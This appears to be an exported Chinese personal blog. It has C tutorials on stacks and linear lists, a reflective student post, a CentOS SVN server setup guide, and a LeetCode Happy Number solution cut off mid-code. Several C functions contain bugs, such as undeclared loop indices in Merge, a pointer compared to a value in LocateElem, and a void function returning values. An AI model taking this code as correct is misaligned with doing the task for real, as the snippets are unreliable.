    <content type="text"><![CDATA[继续上一篇博客的话题，继续总结数据结构的相关知识，此篇博客主要总结栈的基本概念、存储结构、基本操作以及应用，栈是一种操作受限的线性表，只允许在表的一端进行插入和删除，也正因为它的这个特点，使得栈的应用十分广泛，比如数制转换、表达式求值等问题的解决都用到栈以及栈在递归中的重要作用。 栈的基本概念定义：只允许在表的一端进行插入和删除的操作的线性表。 栈顶：允许插入和删除的一端。 特点：后进先出（Last In First Out，LIFO）。 顺序栈 对栈顶指针进行初始化时，可以将其初始化为-1，也可以初始化为0，当初始化为-1时栈顶指针指向的元素即为栈顶元素，而初始化为0时，栈顶指针减1所指向的元素才是栈顶元素，具体区别如下： 初始化栈顶指针S-&gt;top = -1时栈顶元素为S-&gt;data[S-&gt;top] 进栈操作：先将栈顶指针加1，再送值到栈顶元素，即S-&gt;data[++S-&gt;top] = x 出栈操作：先取栈顶元素值，再将栈顶指针减1，即x = S-&gt;data[S-&gt;top–] 栈空条件：S-&gt;top = -1 栈满条件：S-&gt;top = MAXSIZE - 1 栈长：S-top + 1 初始化栈顶指针S-&gt;top = 0时栈顶元素为S-&gt;data[S-&gt;top - 1] 进栈操作：先送值到栈顶元素，栈顶指针再加1，即S-&gt;data[S-&gt;top++] = x 出栈操作：先将栈顶指针减1，再取栈顶元素值，即x = S-&gt;data[–S-&gt;top] 栈空条件：S-&gt;top = 0 栈满条件：S-&gt;top = MAXSIZE 栈长：S-top 基本操作实现下面以将栈顶指针初始化为0为例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ElemType int#define MAXSIZE 100 //定义栈的最大容量#define true 1#define false 0typedef struct&#123; ElemType data[MAXSIZE]; //存放栈中元素的数组 int top; //栈顶指针&#125;SeqStack;/******构造一个空栈******/void InitStack(SeqStack *S)&#123; S-&gt;top = 0; //栈顶指针初始化为0&#125;/*******判断栈空*******/int StackEmpty(SeqStack *S)&#123; if(S-&gt;top == 0) return true; else return false;&#125;/***********出栈操作***********/int Pop(SeqStack *S,ElemType *e)&#123; if(S-&gt;top == 0) //若栈空出栈失败 return false; *e = S-&gt;data[-- S-&gt;top]; //修改栈顶指针，并保存栈顶元素 return true;&#125;/***********进栈操作***********/int Push(SeqStack *S,ElemType e)&#123; if(S-&gt;top == MAXSIZE) //若栈满则进栈失败 return false; S-&gt;data[S-&gt;top ++] = e; //将e插入栈顶，并修改栈顶指针 return true;&#125;/***********取栈顶元素***********/int GetTop(SeqStack *S,ElemType *e)&#123; if(S-&gt;top == 0) //若栈空取栈顶元素失败 return false; *e = S-&gt;data[S-&gt;top-1]; //保存栈顶元素 return true;&#125;int main()&#123; SeqStack S; InitStack(&amp;S); .... 进行进栈、出栈、判断栈空等操作 ....&#125; 链栈利用单链表结构来实现的栈，即栈中的每一个数据元素用一个结点来表示，同时设置一个指针top来指示栈顶元素的当前位置。 特点 便于多个栈共享存储空间 不存在栈满溢出的情况 操作与链表类似，便于结点的插入和删除 基本操作实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ElemType int#define false 0#define true 1typedef struct SNode&#123; ElemType data; //数据域 struct SNode *next; //指针域&#125;SNode;typedef struct&#123; SNode *top; //栈顶指针&#125;LinkStack;/*******构造一个空栈*******/int InitStack(LinkStack *S)&#123; S = (LinkStack *)malloc(sizeof(LinkStack)); //分配栈顶指针的内存空间 if(S == NULL) //内存分配失败 return false; S-&gt;top = NULL; //栈顶指针置为空 return true;&#125;/**********置栈空**********/void ClearStack(LinkStack *S)&#123; S-&gt;top = NULL; //将栈顶指针置为空&#125;/*********判断栈空********/int StackEmpty(LinkStack *S)&#123; return S-&gt;top == NULL; //判断栈顶指针是否为空&#125;/***********进栈操作***********/int Push(LinkStack *S,ElemType e)&#123; SNode *temp; temp = (SNode *)malloc(sizeof(SNode)); //生成新的结点 if(temp == NULL) //内存分配失败 return false; temp-&gt;data = e; //赋值给结点数据域 temp-&gt;next = S-&gt;top; //插入栈顶 S-&gt;top = temp; //修改栈顶指针 return true;&#125;/***********出栈操作***********/int Pop(LinkStack *S,ElemType *e)&#123; SNode *temp; if(S-&gt;top == NULL) //若栈为空则出栈失败 return false; temp = S-&gt;top; S-&gt;top = temp-&gt;next; //修改栈顶指针 *e = temp-&gt;data; //保存栈顶元素 free(temp); //释放出栈结点 return true;&#125;/***********取栈顶元素***********/int GetTop(LinkStack *S,ElemType *e)&#123; if(S-&gt;top == NULL) //若栈为空则无法获取栈顶元素 return false; *e = S-&gt;top-&gt;data; //取栈顶指针指向的元素 return true;&#125;int main()&#123; LinkStack S; InitStack(&amp;S); .... 进行进栈、出栈、判断栈空等操作 ....&#125; 共享栈为了避免出现有的栈溢出有的栈空闲的情况，可以让多个栈共享一个足够大的数组空间，是存储空间得到充分利用。常见的是两栈共享空间，即让两个栈共享一个一维数组空间，使两个栈的栈底分别设置在共享空间的两端，两个栈顶向共享空间的中间延伸。 特点同样，由于初始化的不同会出现两种情况，这里以初始化栈1的栈顶指针为0，栈2的栈顶指针为MAXSIZE-1为例进行说明： 栈满条件：S-&gt;top1 = S-&gt;top2 + 1 栈空条件：S-&gt;top1 = 0 或 S-&gt;top2 = MAXSIZE - 1 进栈操作：栈1：先赋值栈顶指针再加1，栈2：先赋值栈顶指针再减1 出栈操作：栈1：栈顶指针先减1再赋值，栈2：栈顶指针先加1再赋值 栈顶元素：栈1：S-&gt;data[S-&gt;top1-1]，栈2：S-&gt;data[S-&gt;top2-1] 如果初始化栈1的栈顶指针为-1，栈2的栈顶指针为MAXSIZE会有什么不同呢？还是自己想一想吧，这里就不给出啦。 基本操作实现下面是初始化为0和MAXSIZE-1的情况： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ElemType int#define MAXSIZE 100 //定义栈的最大容量#define true 1#define false 0typedef struct&#123; ElemType data[MAXSIZE]; //两栈共享的数组空间 int top[2]; //两栈的栈顶指针&#125;DSeqStack;/*********构造一个空栈*********/void InitStack(DSeqStack *S)&#123; S-&gt;top[0] = 0; //初始化栈1的栈顶指针 S-&gt;top[1] = MAXSIZE-1; //初始化栈2的栈顶指针&#125;/*********判断栈是否为空*********/int StackEmpty(DSeqStack *S,int i)&#123; switch(i)&#123; case 1: return (S-&gt;top[0] == 0? true:false); //判断栈1是否为空 break; case 2: return (S-&gt;top[1] == MAXSIZE-1? true:false); //判断栈2是否为空 break; default: return false; //参数错误 &#125;&#125;/**************进栈操作**************/int Push(DSeqStack *S,ElemType e,int i)&#123; if(S-&gt;top[0] == S-&gt;top[1]+1) //判断栈空间是否满 return false; switch(i)&#123; case 1: S-&gt;data[S-&gt;top[0]] = e; //将e压入第1个栈 S-&gt;top[0]++; break; case 2: S-&gt;data[S-&gt;top[1]] = e; //将e压入第2个栈 S-&gt;top[1]--; break; default: return false; //参数错误 &#125; return true;&#125;/**************出栈操作**************/int Pop(DSeqStack *S,ElemType *e,int i)&#123; switch(i)&#123; case 1: if(S-&gt;top[0] == 0) //判断栈1是否为空 return false; S-&gt;top[0]--; //修改栈1的栈顶指针 *e = S-&gt;data[S-&gt;top[0]]; //从第1个栈中弹出 break; case 2: if(S-&gt;top[1] == MAXSIZE-1) //判断栈2是否为空 return false; S-&gt;top[1]++; //修改栈2的栈顶指针 *e = S-&gt;data[S-&gt;top[1]]; //从第2个栈中弹出 break; default: return false; //参数错误 &#125; return true;&#125;int main()&#123; DSeqStack S; InitStack(&amp;S); .... 进行进栈、出栈、判断栈空等操作 ....&#125; 栈的应用数制转换数制转换过程中我们得到的结果序列往往是我们所要结果的逆序，这时候就需要栈来帮忙了。比如，将十进制数12转换成二进制序列，过程如下： 12345612/2 = 6...06/2 = 3...03/2 = 1...11/2 = 0...1依次得到0011，但是12的二进制表示为1100，即为逆序。 所以我们需要将每次得到的余数压入栈中，一直到没有元素需要压入栈中时再将元素依次从栈中弹出，即得到正确的结果。 以十进制转K进制为例： 1234567891011121314void Conversion(int n,int k)&#123; ElemType x; SeqStack S; InitStack(&amp;S); while(n&gt;0)&#123; x = n%k; Push(&amp;S,x); //将得到的余数依次压入栈中 n = n/k; &#125; while(!StackEmpty(&amp;S))&#123; Pop(&amp;S,&amp;x); printf(&quot;%d&quot;,x); &#125;&#125; 栈的应用还有很多，比如括号匹配的检验、表达式求值，以及栈在递归中的重要作用。这里就不再一一描述了，以后在Leetcode上看到类似的题目再进行说明。]]></content>
      <categories>
        <category>Data structure</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构基础之线性表]]></title>
    <url>%2F2016%2F09%2F06%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%BA%BF%E6%80%A7%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[数据结构也是算法学习的一部分，最近比较忙，在对所学的知识查漏补缺，没有学习什么新的东西，于是干脆就对一直在复习数据结构来了个大总结，这篇博客主要是数据结构的线性表部分，争取尽快把其他部分总结完。接下来的一段时间可能不会经常去Leetcode刷题了，近期的算法学习这一系列的博客将以数据结构为主，因为近来有更重要的事情要做，毕竟精力有限，刷题这一块就先放一放咯。 线性表的基本概念定义：具有相同数据类型的n(n&gt;=0)个数据元素的有限序列 线性表的特点： 1、表中的元素个数有限。 2、表中元素具有逻辑上的顺序性，在序列中各元素排列有其先后顺序。 3、表中元素都是数据元素，每个元素都是单个元素。 4、表中元素的数据类型都相同。 5、表中元素具有抽象性。即仅讨论元素间的逻辑关系，不考虑元素究竟表示什么内容。 顺序存储顺序表线性表的顺序存储。用一组地址连续的存储单元，依次存储线性表中的数据元素，使得逻辑上相邻的两个元素在物理上也相邻。 注意：顺序表的位序是从1开始的，而数组中元素的下标是从0开始的。 基本操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ElemType int#define OVERFLOW -2#define true 1#define false 0#define LIST_INIT_SIZE 10 //线性表存储空间的初始分配量#define LIST_INCREMENT 2 //线性表存储空间的分配增量typedef struct&#123; ElemType *data; //存储空间基址 int length; //当前长度 int listsize; //当前分配的存储容量(以sizeof(ElemType)为单位)&#125;SeqList;/********初始化********/int InitList(SeqList *L)&#123; L-&gt;data = (ElemType *)malloc(sizeof(ElemType)*LIST_INIT_SIZE); if(!L-&gt;data) return OVERFLOW; L-&gt;length = 0; L-&gt;listsize = LIST_INIT_SIZE; return true;&#125;/****************插入操作*****************/int ListInsert(SeqList *L,int i,ElemType e)&#123; int j; if(i&lt;1||i&gt;L-&gt;length+1) //判断i的范围是否有效 return false; if(L-&gt;length == L-&gt;listsize) //存储空间已满时不能插入 return OVERFLOW; for(j=L-&gt;length;j&gt;=i;j--) //将第i个元素及之后的元素后移 L-&gt;data[j]=L-&gt;data[j-1]; L-&gt;data[i-1]=e; //在位置i处放入e L-&gt;length++; //线性表长度加1 return true;&#125;/***********删除操作***********/int ListDelete(SeqList *L,int i)&#123; int j; if(i&lt;1||i&gt;L-&gt;length+1) //判断i的范围是否有效 return false; for(j=i;j&lt;L-&gt;length;j++) //将第i个位置之后的元素前移 L-&gt;data[j-1] = L-&gt;data[j]; L-&gt;length--; //线性表长度减1 return true;&#125;/**********按位置查找************/ElemType GetElem(SeqList *L,int i)&#123; if(i&lt;1||i&gt;L-&gt;length+1) //判断i的范围是否有效 return false; return L-&gt;data[i-1];&#125;/*************按值查找**************/int LocateElem(SeqList *L,ElemType e)&#123; int i; for(i=0;i&lt;L-&gt;length;i++)&#123; if(L-&gt;data[i] == e) return i+1; &#125; return 0;&#125;/*********求表长**********/int ListLength(SeqList *L)&#123; return L-&gt;length;&#125;/******判断是否是空表*****/void ListEmpty(SeqList *L)&#123; if(L-&gt;length == 0) return true; else return false;&#125;/*********输出表*********/void printList(SeqList *L)&#123; int i; for(i=0;i&lt;L-&gt;length;i++) printf(&quot;%d &quot;,L-&gt;data[i]);&#125;/*********清空表********/void ClearList(SeqList *L)&#123; L-&gt;length = 0;&#125;/*********销毁表********/void DstroyList(SeqList *L)&#123; free(L-&gt;data); L-&gt;data = NULL; L-&gt;length = 0; L-&gt;listsize = 0;&#125;int main()&#123; SeqList L; InitList(&amp;L); .... 进行插入、删除、查找结点等操作 .... return 0;&#125; 扩展操作 1234567891011121314151617181920212223242526272829303132333435363738/********将顺序表的所有元素逆置******/void Reverse(SeqList *L)&#123; int i; ElemType temp; //辅助变量 for(i=0;i&lt;((L-&gt;length)/2);i++)&#123; //扫描顺序表L，进行元素交换 temp = L-&gt;data[i]; L-&gt;data[i] = L-&gt;data[L-&gt;length-1-i]; L-&gt;data[L-&gt;length-1-i] = temp; &#125;&#125;/******删除有序顺序表中重复的元素******/void Del_same(SeqList *L)&#123; int i,j; for(i=0,j=1;j&lt;L-&gt;length;j++)&#123; //i存储第一个不相同的元素，j工作指针 if(L-&gt;data[i] != L-&gt;data[j])&#123; //查找下一个与上一个元素值不相同的元素 L-&gt;data[++i] = L-&gt;data[j]; //找到后，则将元素前移 &#125; &#125; L-&gt;length = i+1; //删除相同元素后，线性表的长度&#125;/*****将两个有序顺序表合并成一个新的有序顺序表*****/int Merge(SeqList *L1,SeqList *L2,SeqList *L)&#123; if(L1-&gt;length + L2-&gt;length &gt; L-&gt;length) //大于合并表的长度 return false; while(i &lt; L1-&gt;length &amp;&amp; j &lt; L2-&gt;length)&#123; //循环，两两比较，较小的存入结果表 if(L1-&gt;data[i] &lt;= L2-&gt;data[j]) L-&gt;data[k++] = L1-&gt;data[i]; else L-&gt;data[k++] = L2-&gt;data[j]; &#125; while(i &lt; L1-&gt;length) //处理剩下没比完的顺序表 L-&gt;data[k++] = L1-&gt;data[i++]; while(j &lt; L2-&gt;length) L-&gt;data[k++] = L2-&gt;data[i++]; return true;&#125; 链式存储单链表单链表：通过一组任意的存储单元来存储线性表中的数据元素。 头结点head指向单链表的第一个结点。 结点由两部分组成：数据域data，指针域next(存放直接后继元素的地址)。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ElemType int#define true 1#define false 0typedef struct LNode&#123; ElemType data; struct LNode *next;&#125;LNode,*LinkList;/************头插法建立链表*************/LinkList HeadInsert_CreatList(LinkList L)&#123; int n; LNode *s; L = (LinkList)malloc(sizeof(LNode)); //创建头结点 L-&gt;next = NULL; printf(&quot;采用头插法建立链表，请输入结点值，以9999结束：\n&quot;); scanf(&quot;%d&quot;,&amp;n); while(n!=9999)&#123; s = (LinkList *)malloc(sizeof(LNode)); //创建新结点 s-&gt;data = n; s-&gt;next = L-&gt;next; L-&gt;next = s; //将新结点插入表中 scanf(&quot;%d&quot;,&amp;n); &#125; return L;&#125;/************尾插法建立链表*************/LinkList RearInsert_CreatList(LinkList L)&#123; int n; LNode *s,*r; L = (LinkList)malloc(sizeof(LNode)); //创建头结点 r = L; printf(&quot;采用尾插法建立链表，请输入结点值，以9999结束：\n&quot;); scanf(&quot;%d&quot;,&amp;n); while(n!=9999)&#123; s = (LNode *)malloc(sizeof(LNode)); //创建新结点 s-&gt;data = n; r-&gt;next = s; r = s; //r指向新的表尾结点 scanf(&quot;%d&quot;,&amp;n); &#125; r-&gt;next = NULL; //表尾结点指针置空 return L;&#125;/*******按序号查找结点值*******/LNode* GetElem(LinkList L,int i)&#123; int j = 1; LNode *p = L-&gt;next; //头结点指针赋给p if(i==0) //i=0返回头结点 return L; if(i&lt;1) //i无效则返回NULL return NULL; while(p&amp;&amp;j&lt;i)&#123; //从第1个结点开始查找第i个结点 p = p-&gt;next; j++; &#125; return p; //返回第i个结点的指针&#125;/*************按值查找结点*************/LNode* LocateElem(LinkList L,ElemType e)&#123; LNode *p = L-&gt;next; //头结点指针赋给p while(p!=NULL&amp;&amp;p-&gt;next!=e) //从第1个结点开始查找值为e的结点 p = p-&gt;next; return p; //找到则返回值为e的结点，否则返回NULL&#125;/****************插入结点****************/int ListInsert(LinkList L,int i,ElemType x)&#123; LNode *s,*p; p = GetElem(L,i-1); //查找插入位置的前驱结点 s = (LNode *)malloc(sizeof(LNode)); //创建新结点 s-&gt;data = x; s-&gt;next = p-&gt;next; p-&gt;next = s; return true;&#125;/*********求表长*********/int ListLength(LinkList L)&#123; int len = 0; LNode *p = L-&gt;next; //头结点指针赋给p while(p)&#123; len++; //记录表中结点个数 p = p-&gt;next; &#125; return len; //返回表长&#125;/***********删除结点***********/int ListDelete(LinkList L,int i)&#123; LNode *p = GetElem(L,i-1); //查找待删除结点的前驱结点 LNode *q = p-&gt;next; //p指向需要删除的结点 p-&gt;next = q-&gt;next; //修改指针 free(q); //释放删除结点的存储空间 return true;&#125;/*****打印链表结点值******/int ListPrint(LinkList L)&#123; LNode *p = L-&gt;next; //头结点指针赋给p while(p)&#123; printf(&quot;%d &quot;,p-&gt;data); //按顺序依次输出结点值 p = p-&gt;next; &#125; printf(&quot;\n&quot;);&#125;int main()&#123; LinkList L1,L2; L1 = HeadInsert_CreatList(L1); printf(&quot;采用头插法建立的链表L1的结点值为：&quot;); ListPrint(L1); L2 = RearInsert_CreatList(L2); printf(&quot;采用尾插法建立的链表L2的结点值为：&quot;); ListPrint(L2); .... 进行插入、删除、查找结点等操作 .... return 0;&#125; 双链表每个结点设置两个指针prior和next，分别指向其前驱结点和后继结点。 1234typedef struct DNode&#123; ElemType data; //数据域 struct DNode *prior,*next; //前驱和后继指针&#125;DNode,*DLinkList; 插入操作： 12345//将结点*s插入到结点*p之后s-&gt;next = p-&gt;next;p-&gt;next-&gt;prior = s;s-&gt;prior = p;p-&gt;next = s; 删除操作：1234//删除结点*p的后继结点*qp-&gt;next = q-&gt;next;q-&gt;next-&gt;proir = p;free(q); 循环单链表将单链表的最后一个指针由NULL改为指向头结点，使整个链表形成一个环。 判空条件为：头结点的指针是否等于头结点。 插入删除与单链表相同。 静态链表借助数组来描述线性表的链式存储结构。 结点由两部分组成：数据域data，下一个元素的数组下标next。 1234typedef struct&#123; ElemType data; //存储数据元素 int next; //下一个元素的数组下标&#125;SLinkList[MAXSIZE]; 以next=-1作为其结束的标志。 顺序表和链表的比较存取方式顺序表：可以顺序存取也可以随机存取。 链表：只能从表头顺序存取元素。 逻辑结构与物理结构顺序表：逻辑上相邻的元素，其对应的物理存储位置也相邻。 链表：逻辑上相邻的元素，其物理存储位置则不一定相邻。 查找、插入和删除操作查找： 按值查找时，顺序表无序时，顺序表和链表的时间复杂度均为O(n)，但是当顺序表有序时，可采用折半查找，时间复杂度为O(log2n)。 按序号查找时，顺序表的时间复杂度仅为O(1)，而链表的平均时间复杂度为O(n)。 插入和删除： 顺序表平均需要移动半个表长的元素，而链表只需要修改相关指针即可。 空间分配顺序存储在空间分配中存在诸多问题与隐患，比如内存溢出、内存闲置等，而链式存储的结点空间只在需要的时候申请分配，只要内存有空间就可以分配，操作灵活、高效。]]></content>
      <categories>
        <category>Data structure</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开学季-那些迷茫与美好]]></title>
    <url>%2F2016%2F08%2F31%2F%E5%BC%80%E5%AD%A6%E5%AD%A3-%E9%82%A3%E4%BA%9B%E8%BF%B7%E8%8C%AB%E4%B8%8E%E7%BE%8E%E5%A5%BD%2F</url>
    <content type="text"><![CDATA[大学的最后一个暑假已经结束，明天就是九月了，开学已经好几天，但是根本没有任何开学的感觉，毕竟都是大四的老腊肉了。没有一节课的大四生活就这样悄悄地开始了，不知道接下来会发生什么，也不知道这一年自己可以做些什么，有时候选择很多也未必是好事，因为这样会很迷茫。就像现在的我，每天都觉得很迷茫，但是我还是按照既定的计划每天向前走着。这样的日子说不上很美好，但是却很安静，也很满足。 这个暑假，基本的安排都在有序的进行着，虽然总会有一些烦人的事情，也会有担忧，但是都还是坚持下来了。最近看了鲁豫有约之大咖一日行第一期王健林的那个视频，这些大咖总是又让我们很佩服的事情，虽然他们肯定有过人之处，就像他那句话刷爆了朋友圈的话：先定一个小目标，比方说我先挣它一个亿。我觉得确实说得很对啊，抛开大家对于一个亿是小目标的玩笑，认真想想，很多时候，我们就是缺少一个实际一点的目标。我们可以根据自己的实际情况对自己定一些小目标，然后关键就在于我们能不能坚持去做了。我也给自己定过很多小目标，有的完成了，有的没完成，但是这个过程中收获还是有的。 先定一个小目标，比方说我先写它30篇博客。暑假，在复习之余也一直在更新自己的博客，我始终认为技术不能丢，安卓和算法这是这个暑假主要在学习的两块内容。暑假写了差不多30篇博客，有时候也会很烦，写一篇博客确实需要花费很多的精力，从选题到拟定提纲、到查阅资料、编写实例，再到格式整理等等，这个过程其实是很漫长而又艰难的，有时候也会想要放弃，但是每次写完都还是很有成就感的。虽然可能自己写的博客没有多少人来看，但是这都不重要，写博客本来就是对自我学习的总结以及对自己写作能力的锻炼。 考研这条路不再像高考，高考的时候你的身边都是为了考大学这一个目标，但是现在似乎不再有以前的那种氛围，那股冲劲，身边很多人都去实习了，留下的也基本都在等秋招，自己也投了一些简历，想去试试。现在的生活真的很安静，早上早起打打球，白天静静地待在图书馆学习，晚上静静地在寝室写代码写博客，没有什么压力，也没有什么束缚，其实这样也挺好。 不管怎么说，信心还是要有的。一直以来对于自己的自学能力还是很有信心的，大学里学到的很多技术也都是靠自己查资料、实践以及向老师学长学姐请教学来的。但是也开始意识到自己薄弱的地方，慢慢懂得数据结构与算法是软件的核心，不管是考研还是找工作，数据结构与算法都是很重要的知识。虽然有些技能不需要人教我就可以很快掌握，但是在数据结构和算法方面自己还是很欠缺的。不想做一个只会写代码的底层码农，而想要成为有思想的程序员，要慢慢地朝着架构师的方向发展。 不知道九月甚至是大四的这一年会发生些什么，也不知道接下来我会怎样走下去，虽然迷茫但是从来不畏惧，相信努力、勤奋与坚持会带来改变。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于CentOS7的SVN服务器配置]]></title>
    <url>%2F2016%2F08%2F30%2F%E5%9F%BA%E4%BA%8ECentOS7%E7%9A%84SVN%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[SVN是Subversion的简称，它是一个受欢迎的开放源代码的版本控制系统。简单一点说，SVN就是用于多个人共同开发同一个项目，共用资源的目的。作为软件开发人员，很有必要了解和学习SVN的使用。学习版本控制从SVN安装与配置开始，此篇博客主要讲解基于阿里云服务器的SVN服务器配置。 版本控制版本控制系统 (VCS) 是一个软件，帮助软件开发人员团队工作并维持他们完整的工作历史。 版本控制系统(VCS) 的目标： 允许开发者们同时工作 不会重写每个人的改变 维持每个版本的全部的历史 VCS被分成两种 集中版本控制系统 (CVCS) 和 分散或不集中的版本控制系统 (DVCS) Subversion 基于集中的版本控制系统，意味着使用统一的服务器让团队协作。 安装SVN大多数 GNU/Linux 发行版系统自带，所以它很有可能已经安装在你的系统上了。可以使用下面命令检查是否安装了。 1svn --version 如果系统已经安装Subversion客户端，使用上面的命令会出现安装的软件版本，否则会提示命令找不到。 如果你使用基于RPM的GNU/Linux，可以切换到root用户使用yum命令进行安装，安装成功之后，执行 svn –version 命令。 1yum install subversion 如果你使用基于Debian的GNU/Linux，使用apt命令进行安装。 1sudo apt-get update 另外，还需要安装Apache httpd模块，如果没有安装请自行百度吧，这里主要讲解如何配置SVN。 注：博主租用的阿里云的服务器，采用CentOS系统，自带SVN，并且我已经安装好了Apache httpd模块。 创建目录保存所有的工作1mkdir -p /var/svn 创建版本库1svnadmin create /var/svn/repo 创建完成后，可以使用ls命令看到，在版本库中存在如下文件： 1conf db format hooks locks README.txt 配置版本库在conf目录下有如下三个文件： svn服务综合配置文件（svnserve.conf） 用户名口令文件（passwd） 权限配置文件（authz） 配置svnserve.conf文件找到以下四行，删除前面的注释符使其起作用： 1234anon-access = read #匿名用户可读auth-access = write #授权用户可写password-db = passwd #使用哪个文件作为账号文件authz-db = authz.conf #使用哪个文件作为权限文件 配置passwd文件在[users]块中添加用户和密码，格式：帐号=密码，例如添加如下两个账户： 123[users]fzy = 123456hunau = 111111 配置authz文件在末尾添加如下代码： 123[/]fzy = rwhunau = r 意思是版本库的根目录fzy用户对其有读写权限，hunau用户只有读权限。 启动和使用配置成功以后，使用如下命令启动svn版本库服务： 1svnserve -d -r /var/svn #其中/var/svn为版本库根目录 查看是否启动成功： 1ps -ef|grep svnserve 关闭svn服务（1）使用以下命令查找进程 1ps aux | grep svn 如下：12root 22368 1 0 Aug29 ? 00:00:00 svnserve -d -r /var/svnroot 24538 24423 0 19:58 pts/0 00:00:00 grep --color=auto svn （2）使用Kill命令杀死进程 1kill -s 9 22368 #其中22368 为进程ID Windwos上客户端安装与使用（1）下载安装SVN Windows客户端：TortoiseSVN 下载地址：https://tortoisesvn.net/downloads.html （2）新建一个文件夹用来存放版本库文件 （3）右键选择SVN Checkout （4）填写SVN地址 格式为： 1svn://服务器ip地址/服务器上版本库名称/ （5）输入用户名密码 可以勾选保存账号密码，如果你只用一个账号的话可以这么做，如果需要经常切换账户的话最好不要勾选。 如果已经勾选了，但是又需要切换账户，怎么办呢？ 右键菜单：Settings -&gt; Saved Data-&gt; Authentication data -&gt; Clear （6）在repo文件夹下进行版本控制操作 可以将服务器上的文件通过SVN Update更新到本地，也可以将本地文件通过SVN commit提交到服务器，还有很多的操作，在这里就不一一讲解了，下次写一篇详细的博客进行介绍。 注：文件上传到服务器后存放在服务器什么地方呢？ 一般放在版本库路径下的db文件夹的revs文件夹中，例如我的为/var/svn/repo/db/revs。 需要注意的地方checkout时，提示：URL svn://服务器ip地址/repo doesn’t exist…奇怪，怎么会提示库不存在呢？肯定是哪里配置问题。后来尝试了半天，也在网上搜索了很久，终于发现问题所在。 如果你的svn库的路径为：/var/svn/repo 那么你启动时，不能用命令：1svnserve -d -r /var/svn/repo 而要用命令：1svnserve -d -r /var/svn/ commit时，提示：Authorization failed问题可能出在svnserve.conf这个文件。注意以下四行一定要取消注释： 1234# anon-access = read# auth-access = write# password-db = passwd# authz-db = authz 问题也有可能出在authz文件里，用户组或者用户权限没有配置好，只要设置[/]就可以，代表根目录下所有的资源，如果要限定资源，可以加上子目录即可。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>SVN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(七)]]></title>
    <url>%2F2016%2F08%2F27%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%B8%83%2F</url>
    <content type="text"><![CDATA[Happy NumberLeetCode第202题 题目描述Write an algorithm to determine if a number is “happy”. A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers. Example: 19 is a happy number 1^2 + 9^2 = 82 8^2 + 2^2 = 68 6^2 + 8^2 = 100 1^2 + 0^2 + 0^2 = 1 思路分析快乐数（happy number）有以下的特性：在给定的进位制下，该数字所有数位(digits)的平方和，得到的新数再次求所有数位的平方和，如此重复进行，最终结果必为1。 如果一个数是一个happy number，那么最终是1循环，比较容易判断。如果一个数不是 happy number，那么存在一个循环，其中不包含1，这就比较难判断，因为不清楚这个循环周期大小。一种解决思路是通过HashSet来存取数字，如果这个数字之前存储好了，说明进入一个循环。利用HashSet元素不重复的性质，采用add方法，它会返回一个boolean值，如果集合中已经存在该元素返回false，否则返回true。 Java语言实现12345678910111213141516171819public class Solution &#123; public boolean isHappy(int n) &#123; Set&lt;Integer&gt; records = new HashSet&lt;Integer&gt;(); while(n!=1)&#123; if(!records.add(n)) //把结果添加到记录中，如果集合中已经存在该元素则判断为非快乐数 return false; else&#123; int sum = 0; while(n!=0)&#123; //依次得到各个位的平方数并加起来 int digit = n%10; sum = sum + digit*digit; n = n/10; &#125; n = sum; //把结果赋给n &#125; &#125; return true; &#125;&#125; 这道题目自己用C语言一直没有AC出来，于是上网找了找资料，所有不快乐数的数位平方和计算，最后都会进入4 → 16 → 37 → 58 → 89 → 145 → 42 → 20 → 4的周期性循环。那如何判断周期性循环呢？这就需要用到Floyd判圈算法的思想了： Floyd判圈算法(Floyd Cycle Detection Algorithm)，又称龟兔赛跑算法(Tortoise and Hare Algorithm)。该算法由美国科学家罗伯特·弗洛伊德发明，是一个可以在有限状态机、迭代函数或者链表上判断是否存在环，求出该环的起点与长度的算法。 初始状态下，假设已知某个起点节点为节点S。现设两个指针t和h，将它们均指向S。接着，同时让t和h往前推进，但是二者的速度不同：t每前进1步，h前进2步。只要二者都可以前进而且没有相遇，就如此保持二者的推进。当h无法前进，即到达某个没有后继的节点时，就可以确定从S出发不会遇到环。反之当t与h再次相遇时，就可以确定从S出发一定会进入某个环。 运用此思想进行解题： LeetCode AC的代码123456789101112131415161718192021int digitSquareSum(int n) &#123; //得到该数字所有数位的平方和 int sum = 0, tmp; while (n) &#123; tmp = n % 10; sum += tmp * tmp; n /= 10; &#125; return sum;&#125;bool isHappy(int n) &#123; int slow, fast; slow = fast = n; //都从n开始 do &#123; slow = digitSquareSum(slow); //前进一步，即计算一次 fast 